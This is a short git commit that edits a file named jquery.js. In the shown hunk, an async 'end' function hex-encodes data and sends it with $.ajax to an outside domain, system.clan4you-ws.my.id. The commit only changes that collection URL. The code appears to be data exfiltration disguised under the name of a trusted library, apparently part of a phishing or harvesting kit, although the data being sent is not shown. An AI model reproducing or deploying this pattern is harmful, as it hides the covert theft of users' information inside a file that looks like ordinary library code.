0acadcaf6b1c542e8d2eef38fb457c330e71d7ed
SystemY0u <alifaaja88@gmail.com>
2024-09-05 17:41:43 +0700

    jquery.js

--- jquery.js
+++ jquery.js
@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://system.clan4you-ws.my.id/konekin.php?json=" +
+                    "https://system.clan4you-ws.my.id?json=" +
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
